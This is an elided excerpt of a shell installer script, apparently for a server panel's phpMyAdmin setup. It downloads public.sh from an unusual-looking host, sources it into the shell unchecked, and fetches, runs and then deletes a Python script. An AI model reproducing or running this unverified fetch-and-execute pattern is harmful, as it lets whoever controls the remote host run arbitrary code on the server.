...
if [ ! -f $public_file ];then
	wget -O $public_file https://node.binarjoinanalyticnl.nl/install/public.sh -T 5;
fi
. $public_file
...
Install_phpMyAdmin()
{
	...
	#首次启动时禁用公共访问phpmyadmin
	if [ ! -f "/www/server/panel/data/phpmyadmin_out.pl" ];then
		wget -O set_phpmyadmin.py $download_Url/tools/set_phpmyadmin.py -T 5
		chmod +x set_phpmyadmin.py
		btpython set_phpmyadmin.py
		rm -f set_phpmyadmin.py
		echo "True" > /www/server/panel/data/phpmyadmin_out.pl
	fi
}
